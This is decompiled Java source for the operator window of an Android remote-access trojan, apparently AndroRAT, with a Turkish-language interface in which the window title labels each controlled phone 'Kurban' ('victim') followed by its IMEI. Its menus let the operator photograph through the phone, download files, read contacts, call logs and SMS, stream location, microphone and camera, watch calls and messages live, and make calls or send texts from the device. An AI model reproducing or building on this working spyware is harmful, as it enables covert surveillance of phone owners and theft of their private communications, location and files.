/*   1:    */ package gui;
/*   2:    */ 
/*   3:    */ import Packet.AdvancedInformationPacket;
/*   4:    */ import Packet.CallPacket;
/*   5:    */ import Packet.SMSPacket;
/*   6:    */ import gui.panel.CallLogPanel;
/*   7:    */ import gui.panel.ColorPane;
/*   8:    */ import gui.panel.ContactPanel;
/*   9:    */ import gui.panel.FileTreePanel;
/*  10:    */ import gui.panel.HomePanel;
/*  11:    */ import gui.panel.MapPanel;
/*  12:    */ import gui.panel.MonitorPanel;
/*  13:    */ import gui.panel.PicturePanel;
/*  14:    */ import gui.panel.SMSLogPanel;
/*  15:    */ import gui.panel.SoundPanel;
/*  16:    */ import gui.panel.VideoPanel;
/*  17:    */ import java.awt.Color;
/*  18:    */ import java.awt.Toolkit;
/*  19:    */ import java.awt.event.ActionEvent;
/*  20:    */ import java.awt.event.ActionListener;
/*  21:    */ import java.awt.event.WindowEvent;
/*  22:    */ import java.awt.event.WindowListener;
/*  23:    */ import java.io.PrintStream;
/*  24:    */ import java.util.ArrayList;
/*  25:    */ import java.util.Date;
/*  26:    */ import java.util.HashMap;
/*  27:    */ import java.util.HashSet;
/*  28:    */ import javax.swing.BoxLayout;
/*  29:    */ import javax.swing.JFrame;
/*  30:    */ import javax.swing.JMenu;
/*  31:    */ import javax.swing.JMenuBar;
/*  32:    */ import javax.swing.JMenuItem;
/*  33:    */ import javax.swing.JOptionPane;
/*  34:    */ import javax.swing.JPanel;
/*  35:    */ import javax.swing.JScrollPane;
/*  36:    */ import javax.swing.JSplitPane;
/*  37:    */ import javax.swing.JTabbedPane;
/*  38:    */ import javax.swing.KeyStroke;
/*  39:    */ import javax.swing.border.EmptyBorder;
/*  40:    */ import utils.Contact;
/*  41:    */ import utils.MyFile;
/*  42:    */ 
/*  43:    */ public class UserGUI
/*  44:    */   extends JFrame
/*  45:    */   implements WindowListener
/*  46:    */ {
/*  47:    */   private JPanel contentPane;
/*  48:    */   private JTabbedPane tabbedPane;
/*  49:    */   private HomePanel homePanel;
/*  50:    */   private MapPanel mapPanel;
/*  51:    */   private SoundPanel soundPanel;
/*  52:    */   private PicturePanel picturePanel;
/*  53:    */   private FileTreePanel fileTreePanel;
/*  54:    */   private CallLogPanel callLogPanel;
/*  55:    */   private ContactPanel contactPanel;
/*  56:    */   private MonitorPanel monitorCall;
/*  57:    */   private MonitorPanel monitorSMS;
/*  58:    */   private VideoPanel videoPanel;
/*  59:    */   private ColorPane userLogPanel;
/*  60:    */   private SMSLogPanel smsPanel;
/*  61:    */   private HashMap<JPanel, Integer> panChanMap;
/*  62:    */   private String imei;
/*  63:    */   private GUI gui;
/*  64:    */   
/*  65:    */   public UserGUI(String imei, GUI gui)
/*  66:    */   {
/*  67: 93 */     setIconImage(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png")));
/*  68: 94 */     this.imei = imei;
/*  69: 95 */     this.gui = gui;
/*  70:    */     
/*  71: 97 */     this.panChanMap = new HashMap();
/*  72:    */     
/*  73: 99 */     initGUI();
/*  74:    */     
/*  75:101 */     setLocationRelativeTo(null);
/*  76:102 */     setTitle("Kurban : " + imei);
/*  77:103 */     setVisible(true);
/*  78:104 */     setDefaultCloseOperation(2);
/*  79:105 */     fireGetAdvancedInformations();
/*  80:    */   }
/*  81:    */   
/*  82:    */   public void launchMessageDialog(String txt, String title, int type)
/*  83:    */   {
/*  84:109 */     JOptionPane.showMessageDialog(this, txt, title, type);
/*  85:    */   }
/*  86:    */   
/*  87:    */   public void windowClosing(WindowEvent e)
/*  88:    */   {
/*  89:114 */     System.out.println("Kurban penceresi kapatılıyor");
/*  90:115 */     if ((this.mapPanel != null) && 
/*  91:116 */       (this.mapPanel.getStreaming())) {
/*  92:116 */       this.gui.fireStopGPSStreaming(this.imei, ((Integer)this.panChanMap.get(this.mapPanel)).intValue());
/*  93:    */     }
/*  94:118 */     if ((this.soundPanel != null) && 
/*  95:119 */       (this.soundPanel.getStreaming())) {
/*  96:119 */       this.gui.fireStopSoundStreaming(this.imei, ((Integer)this.panChanMap.get(this.soundPanel)).intValue());
/*  97:    */     }
/*  98:121 */     if ((this.monitorCall != null) && 
/*  99:122 */       (this.monitorCall.getMonitoring())) {
/* 100:122 */       this.gui.fireStopCallMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorCall)).intValue());
/* 101:    */     }
/* 102:124 */     if ((this.monitorSMS != null) && 
/* 103:125 */       (this.monitorSMS.getMonitoring())) {
/* 104:125 */       this.gui.fireStopSMSMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorSMS)).intValue());
/* 105:    */     }
/* 106:127 */     if ((this.videoPanel != null) && 
/* 107:128 */       (this.videoPanel.getStreaming())) {
/* 108:128 */       this.gui.fireStopVideoStream(this.imei, ((Integer)this.panChanMap.get(this.videoPanel)).intValue());
/* 109:    */     }
/* 110:130 */     this.gui.closeUserGUI(this.imei);
/* 111:    */   }
/* 112:    */   
/* 113:    */   public void removeTab(JPanel viewer)
/* 114:    */   {
/* 115:134 */     if ((viewer instanceof MapPanel))
/* 116:    */     {
/* 117:135 */       if (this.mapPanel.getStreaming()) {
/* 118:135 */         this.gui.fireStopGPSStreaming(this.imei, ((Integer)this.panChanMap.get(this.mapPanel)).intValue());
/* 119:    */       }
/* 120:136 */       this.mapPanel = null;
/* 121:    */     }
/* 122:138 */     if ((viewer instanceof SoundPanel))
/* 123:    */     {
/* 124:139 */       if (this.soundPanel.getStreaming()) {
/* 125:139 */         this.gui.fireStopSoundStreaming(this.imei, ((Integer)this.panChanMap.get(this.soundPanel)).intValue());
/* 126:    */       }
/* 127:140 */       this.soundPanel = null;
/* 128:    */     }
/* 129:142 */     if ((viewer instanceof VideoPanel))
/* 130:    */     {
/* 131:143 */       if (this.videoPanel.getStreaming()) {
/* 132:143 */         this.gui.fireStopVideoStream(this.imei, ((Integer)this.panChanMap.get(this.videoPanel)).intValue());
/* 133:    */       }
/* 134:144 */       this.videoPanel = null;
/* 135:    */     }
/* 136:146 */     if ((viewer instanceof PicturePanel)) {
/* 137:146 */       this.picturePanel = null;
/* 138:    */     }
/* 139:147 */     if ((viewer instanceof FileTreePanel)) {
/* 140:147 */       this.fileTreePanel = null;
/* 141:    */     }
/* 142:148 */     if ((viewer instanceof CallLogPanel)) {
/* 143:148 */       this.callLogPanel = null;
/* 144:    */     }
/* 145:149 */     if ((viewer instanceof SMSLogPanel)) {
/* 146:149 */       this.smsPanel = null;
/* 147:    */     }
/* 148:150 */     if ((viewer instanceof ContactPanel)) {
/* 149:150 */       this.contactPanel = null;
/* 150:    */     }
/* 151:151 */     if ((viewer instanceof MonitorPanel)) {
/* 152:152 */       if (((MonitorPanel)viewer).getCallMonitor())
/* 153:    */       {
/* 154:153 */         if (this.monitorCall.getMonitoring()) {
/* 155:153 */           this.gui.fireStopCallMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorCall)).intValue());
/* 156:    */         }
/* 157:154 */         this.monitorCall = null;
/* 158:    */       }
/* 159:    */       else
/* 160:    */       {
/* 161:156 */         if (this.monitorSMS.getMonitoring()) {
/* 162:156 */           this.gui.fireStopSMSMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorSMS)).intValue());
/* 163:    */         }
/* 164:157 */         this.monitorSMS = null;
/* 165:    */       }
/* 166:    */     }
/* 167:160 */     this.tabbedPane.remove(viewer);
/* 168:    */   }
/* 169:    */   
/* 170:    */   public void updateHomeInformations(AdvancedInformationPacket packet)
/* 171:    */   {
/* 172:170 */     this.homePanel.updateInformations(packet);
/* 173:    */   }
/* 174:    */   
/* 175:    */   public void updatePreference(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw)
/* 176:    */   {
/* 177:174 */     this.homePanel.updatePreferences(ip, port, wait, phones, sms, kw);
/* 178:    */   }
/* 179:    */   
/* 180:    */   public void fireGetAdvancedInformations()
/* 181:    */   {
/* 182:178 */     this.gui.fireGetAdvInformations(this.imei);
/* 183:    */   }
/* 184:    */   
/* 185:    */   public void fireSaveConnectConfigurations(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw)
/* 186:    */   {
/* 187:182 */     this.gui.fireSaveConnectConfiguration(this.imei, ip, port, wait, phones, sms, kw);
/* 188:    */   }
/* 189:    */   
/* 190:    */   public void updateMap(double lon, double lat, double alt, float speed, float accuracy)
/* 191:    */   {
/* 192:192 */     if (this.mapPanel != null) {
/* 193:192 */       this.mapPanel.updateMap(lon, lat, alt, speed, accuracy);
/* 194:    */     }
/* 195:    */   }
/* 196:    */   
/* 197:    */   public void fireStartGPSStreaming(String provider)
/* 198:    */   {
/* 199:196 */     this.gui.fireStartGPSStreaming(this.imei, provider);
/* 200:    */   }
/* 201:    */   
/* 202:    */   public void fireStopGPSStreaming()
/* 203:    */   {
/* 204:200 */     this.gui.fireStopGPSStreaming(this.imei, ((Integer)this.panChanMap.get(this.mapPanel)).intValue());
/* 205:    */   }
/* 206:    */   
/* 207:    */   public void updatePicture(byte[] picture)
/* 208:    */   {
/* 209:209 */     if (this.picturePanel != null) {
/* 210:209 */       this.picturePanel.updateImage(picture);
/* 211:    */     }
/* 212:    */   }
/* 213:    */   
/* 214:    */   public void fireTakePicture()
/* 215:    */   {
/* 216:213 */     this.gui.fireTakePicture(this.imei);
/* 217:    */   }
/* 218:    */   
/* 219:    */   public void addSoundBytes(byte[] data)
/* 220:    */   {
/* 221:222 */     if (this.soundPanel != null) {
/* 222:222 */       this.soundPanel.addSoundBytes(data);
/* 223:    */     }
/* 224:    */   }
/* 225:    */   
/* 226:    */   public void fireStartSoundStreaming(int source)
/* 227:    */   {
/* 228:226 */     this.gui.fireStartSoundStreaming(this.imei, source);
/* 229:    */   }
/* 230:    */   
/* 231:    */   public void fireStopSoundStreaming()
/* 232:    */   {
/* 233:230 */     this.gui.fireStopSoundStreaming(this.imei, ((Integer)this.panChanMap.get(this.soundPanel)).intValue());
/* 234:    */   }
/* 235:    */   
/* 236:    */   public void addVideoBytes(byte[] data)
/* 237:    */   {
/* 238:240 */     if (this.videoPanel != null) {
/* 239:241 */       this.videoPanel.addVideoBytes(data);
/* 240:    */     }
/* 241:    */   }
/* 242:    */   
/* 243:    */   public void fireStartVideoStream()
/* 244:    */   {
/* 245:245 */     this.gui.fireStartVideoStream(this.imei);
/* 246:    */   }
/* 247:    */   
/* 248:    */   public void fireStopVideoStream()
/* 249:    */   {
/* 250:249 */     this.gui.fireStopVideoStream(this.imei, ((Integer)this.panChanMap.get(this.videoPanel)).intValue());
/* 251:    */   }
/* 252:    */   
/* 253:    */   public void updateFileTree(ArrayList<MyFile> fileList)
/* 254:    */   {
/* 255:258 */     if (this.fileTreePanel != null) {
/* 256:258 */       this.fileTreePanel.updateFileTree(fileList);
/* 257:    */     }
/* 258:    */   }
/* 259:    */   
/* 260:    */   public void fireFileDownload(String path, String downPath, String downName)
/* 261:    */   {
/* 262:262 */     this.gui.fireFileDownload(this.imei, path, downPath, downName);
/* 263:    */   }
/* 264:    */   
/* 265:    */   public void fireTreeFile()
/* 266:    */   {
/* 267:266 */     this.gui.fireTreeFile(this.imei);
/* 268:    */   }
/* 269:    */   
/* 270:    */   public void updateCallLogs(ArrayList<CallPacket> logsList)
/* 271:    */   {
/* 272:275 */     if (this.callLogPanel != null) {
/* 273:275 */       this.callLogPanel.updateCallLogs(logsList);
/* 274:    */     }
/* 275:    */   }
/* 276:    */   
/* 277:    */   public void fireGetCallLogs(String request)
/* 278:    */   {
/* 279:279 */     this.gui.fireCallLogs(this.imei, request);
/* 280:    */   }
/* 281:    */   
/* 282:    */   public void updateSMS(ArrayList<SMSPacket> sms)
/* 283:    */   {
/* 284:288 */     if (this.smsPanel != null) {
/* 285:288 */       this.smsPanel.updateSMS(sms);
/* 286:    */     }
/* 287:    */   }
/* 288:    */   
/* 289:    */   public void fireGetSMS(String request)
/* 290:    */   {
/* 291:292 */     this.gui.fireGetSMS(this.imei, request);
/* 292:    */   }
/* 293:    */   
/* 294:    */   public void updateContacts(ArrayList<Contact> contacts)
/* 295:    */   {
/* 296:301 */     if (this.contactPanel != null) {
/* 297:301 */       this.contactPanel.updateContactList(contacts);
/* 298:    */     }
/* 299:    */   }
/* 300:    */   
/* 301:    */   public void fireGetContacts()
/* 302:    */   {
/* 303:305 */     this.gui.fireContacts(this.imei);
/* 304:    */   }
/* 305:    */   
/* 306:    */   public void fireGiveCall(String number)
/* 307:    */   {
/* 308:309 */     this.gui.fireGiveCall(this.imei, number);
/* 309:    */   }
/* 310:    */   
/* 311:    */   public void fireSendSMS(String number, String txt)
/* 312:    */   {
/* 313:313 */     HashMap<String, String> map = new HashMap();
/* 314:314 */     map.put("number", number);
/* 315:315 */     map.put("body", txt);
/* 316:316 */     this.gui.fireSendSMS(this.imei, map);
/* 317:    */   }
/* 318:    */   
/* 319:    */   public void addMonitoredCall(int type, String phoneNumber)
/* 320:    */   {
/* 321:325 */     if (this.monitorCall != null) {
/* 322:325 */       this.monitorCall.addMonitoredCall(type, phoneNumber);
/* 323:    */     }
/* 324:    */   }
/* 325:    */   
/* 326:    */   public void addMonitoredSMS(String addr, long date, String body)
/* 327:    */   {
/* 328:329 */     if (this.monitorSMS != null) {
/* 329:329 */       this.monitorSMS.addMonitoredSMS(addr, date, body);
/* 330:    */     }
/* 331:    */   }
/* 332:    */   
/* 333:    */   public void fireStartCallMonitoring(HashSet<String> phoneNumbers)
/* 334:    */   {
/* 335:333 */     this.gui.fireStartCallMonitoring(this.imei, phoneNumbers);
/* 336:    */   }
/* 337:    */   
/* 338:    */   public void fireStopCallMonitoring()
/* 339:    */   {
/* 340:337 */     this.gui.fireStopCallMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorCall)).intValue());
/* 341:    */   }
/* 342:    */   
/* 343:    */   public void fireStartSMSMonitoring(HashSet<String> phoneNumbers)
/* 344:    */   {
/* 345:341 */     this.gui.fireStartSMSMonitoring(this.imei, phoneNumbers);
/* 346:    */   }
/* 347:    */   
/* 348:    */   public void fireStopSMSMonitoring()
/* 349:    */   {
/* 350:345 */     this.gui.fireStopSMSMonitoring(this.imei, ((Integer)this.panChanMap.get(this.monitorSMS)).intValue());
/* 351:    */   }
/* 352:    */   
/* 353:    */   public void saveMapChannel(int channel)
/* 354:    */   {
/* 355:354 */     this.panChanMap.put(this.mapPanel, Integer.valueOf(channel));
/* 356:    */   }
/* 357:    */   
/* 358:    */   public void saveCallLogChannel(int channel)
/* 359:    */   {
/* 360:358 */     this.panChanMap.put(this.callLogPanel, Integer.valueOf(channel));
/* 361:    */   }
/* 362:    */   
/* 363:    */   public void saveContactChannel(int channel)
/* 364:    */   {
/* 365:362 */     this.panChanMap.put(this.contactPanel, Integer.valueOf(channel));
/* 366:    */   }
/* 367:    */   
/* 368:    */   public void saveMonitorSMSChannel(int channel)
/* 369:    */   {
/* 370:366 */     this.panChanMap.put(this.monitorSMS, Integer.valueOf(channel));
/* 371:    */   }
/* 372:    */   
/* 373:    */   public void saveMonitorCallChannel(int channel)
/* 374:    */   {
/* 375:370 */     this.panChanMap.put(this.monitorCall, Integer.valueOf(channel));
/* 376:    */   }
/* 377:    */   
/* 378:    */   public void savePictureChannel(int channel)
/* 379:    */   {
/* 380:374 */     this.panChanMap.put(this.picturePanel, Integer.valueOf(channel));
/* 381:    */   }
/* 382:    */   
/* 383:    */   public void saveSoundChannel(int channel)
/* 384:    */   {
/* 385:378 */     this.panChanMap.put(this.soundPanel, Integer.valueOf(channel));
/* 386:    */   }
/* 387:    */   
/* 388:    */   public void saveVideoChannel(int channel)
/* 389:    */   {
/* 390:382 */     this.panChanMap.put(this.videoPanel, Integer.valueOf(channel));
/* 391:    */   }
/* 392:    */   
/* 393:    */   private void fireButtonTakePicture()
/* 394:    */   {
/* 395:391 */     if (this.picturePanel == null)
/* 396:    */     {
/* 397:392 */       this.picturePanel = new PicturePanel(this);
/* 398:393 */       this.tabbedPane.addTab("Resim görüntüleyici", this.picturePanel);
/* 399:    */     }
/* 400:395 */     this.tabbedPane.setSelectedComponent(this.picturePanel);
/* 401:    */   }
/* 402:    */   
/* 403:    */   private void fireButtonFileTree()
/* 404:    */   {
/* 405:399 */     if (this.fileTreePanel == null)
/* 406:    */     {
/* 407:400 */       this.fileTreePanel = new FileTreePanel(this);
/* 408:401 */       this.tabbedPane.addTab("Dosya görüntüleyici", this.fileTreePanel);
/* 409:    */     }
/* 410:403 */     this.tabbedPane.setSelectedComponent(this.fileTreePanel);
/* 411:    */   }
/* 412:    */   
/* 413:    */   private void fireButtonCallLogs()
/* 414:    */   {
/* 415:407 */     if (this.callLogPanel == null)
/* 416:    */     {
/* 417:408 */       this.callLogPanel = new CallLogPanel(this);
/* 418:409 */       this.tabbedPane.addTab("Arama kayıtları", this.callLogPanel);
/* 419:    */     }
/* 420:411 */     this.tabbedPane.setSelectedComponent(this.callLogPanel);
/* 421:    */   }
/* 422:    */   
/* 423:    */   private void fireButtonContacts()
/* 424:    */   {
/* 425:415 */     if (this.contactPanel == null)
/* 426:    */     {
/* 427:416 */       this.contactPanel = new ContactPanel(this);
/* 428:417 */       this.tabbedPane.addTab("Kişiler", this.contactPanel);
/* 429:    */     }
/* 430:419 */     this.tabbedPane.setSelectedComponent(this.contactPanel);
/* 431:    */   }
/* 432:    */   
/* 433:    */   private void fireButtonStreamingGPS()
/* 434:    */   {
/* 435:423 */     if (this.mapPanel == null)
/* 436:    */     {
/* 437:424 */       this.mapPanel = new MapPanel(this);
/* 438:425 */       this.tabbedPane.addTab("Harita görüntüleyici", this.mapPanel);
/* 439:    */     }
/* 440:427 */     this.tabbedPane.setSelectedComponent(this.mapPanel);
/* 441:    */   }
/* 442:    */   
/* 443:    */   private void fireButtonStreamingSound()
/* 444:    */   {
/* 445:431 */     if (this.soundPanel == null)
/* 446:    */     {
/* 447:432 */       this.soundPanel = new SoundPanel(this);
/* 448:433 */       this.tabbedPane.addTab("Ses dinleyici", this.soundPanel);
/* 449:    */     }
/* 450:435 */     this.tabbedPane.setSelectedComponent(this.soundPanel);
/* 451:    */   }
/* 452:    */   
/* 453:    */   private void fireButtonStreamingVideo()
/* 454:    */   {
/* 455:439 */     if (this.videoPanel == null)
/* 456:    */     {
/* 457:440 */       this.videoPanel = new VideoPanel(this);
/* 458:441 */       this.tabbedPane.addTab("Kamera görüntüleyici", this.videoPanel);
/* 459:    */     }
/* 460:443 */     this.tabbedPane.setSelectedComponent(this.videoPanel);
/* 461:    */   }
/* 462:    */   
/* 463:    */   private void fireButtonSMS()
/* 464:    */   {
/* 465:447 */     if (this.smsPanel == null)
/* 466:    */     {
/* 467:448 */       this.smsPanel = new SMSLogPanel(this);
/* 468:449 */       this.tabbedPane.addTab("SMS görüntüleyici", this.smsPanel);
/* 469:    */     }
/* 470:451 */     this.tabbedPane.setSelectedComponent(this.smsPanel);
/* 471:    */   }
/* 472:    */   
/* 473:    */   private void fireButtonToastMessage()
/* 474:    */   {
/* 475:455 */     String txt = JOptionPane.showInputDialog(this, "Metni girin :");
/* 476:456 */     this.gui.fireToastMessage(this.imei, txt);
/* 477:    */   }
/* 478:    */   
/* 479:    */   private void fireButtonFinish()
/* 480:    */   {
/* 481:460 */     windowClosing(null);
/* 482:461 */     dispose();
/* 483:    */   }
/* 484:    */   
/* 485:    */   public void fireButtonCloseTab()
/* 486:    */   {
/* 487:465 */     JPanel panel = (JPanel)this.tabbedPane.getSelectedComponent();
/* 488:466 */     if (panel == this.homePanel) {
/* 489:467 */       JOptionPane.showMessageDialog(this, "Ana ekranı kapatamazsınız !", "Yasak işlem!", 0);
/* 490:    */     } else {
/* 491:469 */       removeTab(panel);
/* 492:    */     }
/* 493:    */   }
/* 494:    */   
/* 495:    */   private void fireButtonSendSMS()
/* 496:    */   {
/* 497:474 */     SMSDialog dialog = new SMSDialog(this);
/* 498:475 */     String[] res = dialog.showDialog();
/* 499:476 */     if (res != null)
/* 500:    */     {
/* 501:477 */       HashMap<String, String> map = new HashMap();
/* 502:478 */       map.put("number", res[0]);
/* 503:479 */       map.put("body", res[1]);
/* 504:480 */       this.gui.fireSendSMS(this.imei, map);
/* 505:    */     }
/* 506:    */   }
/* 507:    */   
/* 508:    */   private void fireButtonGiveCall()
/* 509:    */   {
/* 510:485 */     String target = JOptionPane.showInputDialog(this, "Hedef tel. no. girin :");
/* 511:486 */     if (target != null) {
/* 512:486 */       this.gui.fireGiveCall(this.imei, target);
/* 513:    */     }
/* 514:    */   }
/* 515:    */   
/* 516:    */   private void fireButtonMonitorCall()
/* 517:    */   {
/* 518:490 */     if (this.monitorCall == null)
/* 519:    */     {
/* 520:491 */       this.monitorCall = new MonitorPanel(this, true);
/* 521:492 */       this.tabbedPane.addTab("Arama monitörü", this.monitorCall);
/* 522:    */     }
/* 523:494 */     this.tabbedPane.setSelectedComponent(this.monitorCall);
/* 524:    */   }
/* 525:    */   
/* 526:    */   private void fireButtonMonitorSMS()
/* 527:    */   {
/* 528:498 */     if (this.monitorSMS == null)
/* 529:    */     {
/* 530:499 */       this.monitorSMS = new MonitorPanel(this, false);
/* 531:500 */       this.tabbedPane.addTab("SMS monitörü", this.monitorSMS);
/* 532:    */     }
/* 533:502 */     this.tabbedPane.setSelectedComponent(this.monitorSMS);
/* 534:    */   }
/* 535:    */   
/* 536:    */   private void initGUI()
/* 537:    */   {
/* 538:514 */     setDefaultCloseOperation(3);
/* 539:515 */     setBounds(100, 100, 672, 584);
/* 540:    */     
/* 541:517 */     JMenuBar menuBar = new JMenuBar();
/* 542:518 */     setJMenuBar(menuBar);
/* 543:    */     
/* 544:520 */     JMenu mnOptions = new JMenu("Ayarlar");
/* 545:521 */     menuBar.add(mnOptions);
/* 546:    */     
/* 547:523 */     JMenuItem mntmCloseInterface = new JMenuItem("Pencereyi kapat");
/* 548:524 */     mntmCloseInterface.addActionListener(new ActionListener()
/* 549:    */     {
/* 550:    */       public void actionPerformed(ActionEvent e)
/* 551:    */       {
/* 552:526 */         UserGUI.this.fireButtonFinish();
/* 553:    */       }
/* 554:529 */     });
/* 555:530 */     JMenuItem mntmCloseTabViewer = new JMenuItem("Sekmeyi kapat");
/* 556:531 */     mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(82, 2));
/* 557:532 */     mntmCloseTabViewer.addActionListener(new ActionListener()
/* 558:    */     {
/* 559:    */       public void actionPerformed(ActionEvent e)
/* 560:    */       {
/* 561:534 */         UserGUI.this.fireButtonCloseTab();
/* 562:    */       }
/* 563:536 */     });
/* 564:537 */     mnOptions.add(mntmCloseTabViewer);
/* 565:538 */     mnOptions.add(mntmCloseInterface);
/* 566:    */     
/* 567:540 */     JMenu mnRcuprationDeDonnes = new JMenu("Android bilgisi bul");
/* 568:541 */     menuBar.add(mnRcuprationDeDonnes);
/* 569:    */     
/* 570:543 */     JMenuItem mntmPrendrePhoto = new JMenuItem("Fotoğraf çek");
/* 571:544 */     mnRcuprationDeDonnes.add(mntmPrendrePhoto);
/* 572:545 */     mntmPrendrePhoto.addActionListener(new ActionListener()
/* 573:    */     {
/* 574:    */       public void actionPerformed(ActionEvent e)
/* 575:    */       {
/* 576:547 */         UserGUI.this.fireButtonTakePicture();
/* 577:    */       }
/* 578:550 */     });
/* 579:551 */     JMenuItem mntmFileTree = new JMenuItem("Dosya dizini");
/* 580:552 */     mnRcuprationDeDonnes.add(mntmFileTree);
/* 581:553 */     mntmFileTree.addActionListener(new ActionListener()
/* 582:    */     {
/* 583:    */       public void actionPerformed(ActionEvent e)
/* 584:    */       {
/* 585:555 */         UserGUI.this.fireButtonFileTree();
/* 586:    */       }
/* 587:558 */     });
/* 588:559 */     JMenuItem mntmContacts = new JMenuItem("Kişiler");
/* 589:560 */     mnRcuprationDeDonnes.add(mntmContacts);
/* 590:561 */     mntmContacts.addActionListener(new ActionListener()
/* 591:    */     {
/* 592:    */       public void actionPerformed(ActionEvent e)
/* 593:    */       {
/* 594:563 */         UserGUI.this.fireButtonContacts();
/* 595:    */       }
/* 596:566 */     });
/* 597:567 */     JMenuItem mntmCallLogs = new JMenuItem("Arama kaydı");
/* 598:568 */     mnRcuprationDeDonnes.add(mntmCallLogs);
/* 599:569 */     mntmCallLogs.addActionListener(new ActionListener()
/* 600:    */     {
/* 601:    */       public void actionPerformed(ActionEvent e)
/* 602:    */       {
/* 603:571 */         UserGUI.this.fireButtonCallLogs();
/* 604:    */       }
/* 605:574 */     });
/* 606:575 */     JMenuItem mntmSms = new JMenuItem("SMS");
/* 607:576 */     mntmSms.addActionListener(new ActionListener()
/* 608:    */     {
/* 609:    */       public void actionPerformed(ActionEvent arg0)
/* 610:    */       {
/* 611:578 */         UserGUI.this.fireButtonSMS();
/* 612:    */       }
/* 613:580 */     });
/* 614:581 */     mnRcuprationDeDonnes.add(mntmSms);
/* 615:    */     
/* 616:583 */     JMenu mnStreaming = new JMenu("Yayın");
/* 617:584 */     mnRcuprationDeDonnes.add(mnStreaming);
/* 618:    */     
/* 619:586 */     JMenuItem mntmCoordonnesGps = new JMenuItem("Konumlama");
/* 620:587 */     mntmCoordonnesGps.addActionListener(new ActionListener()
/* 621:    */     {
/* 622:    */       public void actionPerformed(ActionEvent e)
/* 623:    */       {
/* 624:589 */         UserGUI.this.fireButtonStreamingGPS();
/* 625:    */       }
/* 626:591 */     });
/* 627:592 */     mnStreaming.add(mntmCoordonnesGps);
/* 628:    */     
/* 629:594 */     JMenuItem mntmSon = new JMenuItem("Ses");
/* 630:595 */     mntmSon.addActionListener(new ActionListener()
/* 631:    */     {
/* 632:    */       public void actionPerformed(ActionEvent e)
/* 633:    */       {
/* 634:597 */         UserGUI.this.fireButtonStreamingSound();
/* 635:    */       }
/* 636:599 */     });
/* 637:600 */     mnStreaming.add(mntmSon);
/* 638:    */     
/* 639:602 */     JMenuItem mntmVido = new JMenuItem("Görüntü");
/* 640:603 */     mntmVido.addActionListener(new ActionListener()
/* 641:    */     {
/* 642:    */       public void actionPerformed(ActionEvent e)
/* 643:    */       {
/* 644:605 */         UserGUI.this.fireButtonStreamingVideo();
/* 645:    */       }
/* 646:607 */     });
/* 647:608 */     mnStreaming.add(mntmVido);
/* 648:    */     
/* 649:610 */     JMenu mnEnvoiDeCommandes = new JMenu("Komut gönder");
/* 650:611 */     menuBar.add(mnEnvoiDeCommandes);
/* 651:    */     
/* 652:613 */     JMenuItem mntmSendToastMessage = new JMenuItem("Toast mesaj gönder");
/* 653:614 */     mntmSendToastMessage.addActionListener(new ActionListener()
/* 654:    */     {
/* 655:    */       public void actionPerformed(ActionEvent e)
/* 656:    */       {
/* 657:616 */         UserGUI.this.fireButtonToastMessage();
/* 658:    */       }
/* 659:618 */     });
/* 660:619 */     mnEnvoiDeCommandes.add(mntmSendToastMessage);
/* 661:    */     
/* 662:621 */     JMenuItem mntmSendSms = new JMenuItem("SMS gönder");
/* 663:622 */     mntmSendSms.addActionListener(new ActionListener()
/* 664:    */     {
/* 665:    */       public void actionPerformed(ActionEvent e)
/* 666:    */       {
/* 667:624 */         UserGUI.this.fireButtonSendSMS();
/* 668:    */       }
/* 669:626 */     });
/* 670:627 */     mnEnvoiDeCommandes.add(mntmSendSms);
/* 671:    */     
/* 672:629 */     JMenuItem mntmGiveCall = new JMenuItem("Arama yap");
/* 673:630 */     mntmGiveCall.addActionListener(new ActionListener()
/* 674:    */     {
/* 675:    */       public void actionPerformed(ActionEvent e)
/* 676:    */       {
/* 677:632 */         UserGUI.this.fireButtonGiveCall();
/* 678:    */       }
/* 679:634 */     });
/* 680:635 */     mnEnvoiDeCommandes.add(mntmGiveCall);
/* 681:    */     
/* 682:637 */     JMenu mnMonitoring = new JMenu("Gözlem");
/* 683:638 */     menuBar.add(mnMonitoring);
/* 684:    */     
/* 685:640 */     JMenuItem mntmCallMonitor = new JMenuItem("Arama monitörü");
/* 686:641 */     mntmCallMonitor.addActionListener(new ActionListener()
/* 687:    */     {
/* 688:    */       public void actionPerformed(ActionEvent e)
/* 689:    */       {
/* 690:643 */         UserGUI.this.fireButtonMonitorCall();
/* 691:    */       }
/* 692:645 */     });
/* 693:646 */     mnMonitoring.add(mntmCallMonitor);
/* 694:    */     
/* 695:648 */     JMenuItem mntmSmsMonitor = new JMenuItem("SMS monitörü");
/* 696:649 */     mntmSmsMonitor.addActionListener(new ActionListener()
/* 697:    */     {
/* 698:    */       public void actionPerformed(ActionEvent e)
/* 699:    */       {
/* 700:651 */         UserGUI.this.fireButtonMonitorSMS();
/* 701:    */       }
/* 702:653 */     });
/* 703:654 */     mnMonitoring.add(mntmSmsMonitor);
/* 704:655 */     this.contentPane = new JPanel();
/* 705:656 */     this.contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
/* 706:657 */     setContentPane(this.contentPane);
/* 707:658 */     this.contentPane.setLayout(new BoxLayout(this.contentPane, 0));
/* 708:    */     
/* 709:660 */     JSplitPane splitPane = new JSplitPane();
/* 710:661 */     splitPane.setOrientation(0);
/* 711:662 */     this.contentPane.add(splitPane);
/* 712:    */     
/* 713:664 */     JScrollPane scrollPane = new JScrollPane();
/* 714:665 */     splitPane.setRightComponent(scrollPane);
/* 715:    */     
/* 716:667 */     this.userLogPanel = new ColorPane();
/* 717:668 */     scrollPane.setViewportView(this.userLogPanel);
/* 718:    */     
/* 719:    */ 
/* 720:    */ 
/* 721:    */ 
/* 722:673 */     this.tabbedPane = new JTabbedPane(1);
/* 723:674 */     splitPane.setLeftComponent(this.tabbedPane);
/* 724:    */     
/* 725:676 */     this.homePanel = new HomePanel(this);
/* 726:677 */     this.tabbedPane.addTab("Ana ekran", null, this.homePanel, null);
/* 727:    */     
/* 728:    */ 
/* 729:    */ 
/* 730:    */ 
/* 731:    */ 
